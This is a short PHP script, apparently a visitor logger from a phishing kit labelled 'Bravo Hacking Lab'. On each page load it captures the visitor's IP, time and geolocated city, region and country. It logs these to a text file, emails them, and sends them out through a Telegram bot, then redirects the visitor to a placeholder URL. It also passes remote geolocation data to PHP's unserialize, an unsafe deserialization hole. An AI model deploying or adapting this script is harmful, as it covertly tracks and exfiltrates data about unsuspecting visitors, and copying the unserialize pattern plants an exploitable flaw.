<?php



# ============= PHP API DEFINED ONLINE =================== #
$ip = getenv("REMOTE_ADDR");
$date = gmdate ("Y/m/d");
$dateHis = gmdate ("H:i:sa");

 $user_ip = getenv('REMOTE_ADDR'); # #
 $geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$user_ip"));
 ##$countryIp = $geo["geoplugin_request"]; # IP BY NUMERIC #
 ##$portId = $geo["geoplugin_status"]; #---------------#
 ##$time_zone = $geo["geoplugin_timezone"]; #----------------#
 $countryName = $geo["geoplugin_countryName"]; # ISP BY NUMERIC COUNTRY-NAME #
 $city = $geo["geoplugin_city"]; # COUNTRY-NAME OF CITY #
 $region = $geo["geoplugin_regionName"]; # COUNTRY-NAME OF REGION #
#---------------------------------------#

$seen = "| Client Currently on Page From : ".$countryName." | ip address : $ip | date : $date @ $dateHis | region : $region | city : $city
";

 # ========= To TXT FILE ================ #
$flogs = fopen("newVisitor.txt","a");
fwrite($flogs, $seen);
fclose($flogs);
# ========= To Email ================ #
 include("visitorEmail.php");
 $subject = "[You have got a new visitor! From]-".$countryName."$ip";
 $headers = 'Bravo Hacking Lab';  
 @mail($to_email,$subject,$seen,$headers);

  # ========= To TELEGRAM ================ #
  
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($seen)."" );
  # ========================= #

header("Location:  url/");

?>